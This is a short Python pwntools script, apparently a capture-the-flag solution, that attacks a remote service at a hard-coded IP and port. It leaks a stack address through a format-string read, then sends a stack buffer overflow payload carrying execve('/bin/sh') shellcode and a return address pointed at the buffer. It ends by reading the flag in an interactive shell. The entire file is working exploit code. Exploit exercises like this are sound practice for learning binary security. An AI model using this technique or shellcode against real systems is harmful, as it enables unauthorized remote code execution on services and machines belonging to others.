from pwn import *
import struct
p = remote('140.113.207.240',8836)

p.recvuntil("\n")
p.send("%p,%p,%p\n")
receive = p.recv(1024)
#print("receive:",receive)

#the 2nd %p point at the end of the address of the input [ps aux=> find pid, use pid to find what's on memory]
#9 stands for 9 characters
start_buf = int(receive.split(',')[1],16)-9
#print("Start buffer: 0x{:08x}".format(start_buf))

padding = "a"*(264-29)
rip = struct.pack("Q",start_buf)
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload = shellcode + padding + rip + "\n"
p.send(payload)
p.recv()
p.send("cat flag\n")
p.interactive()
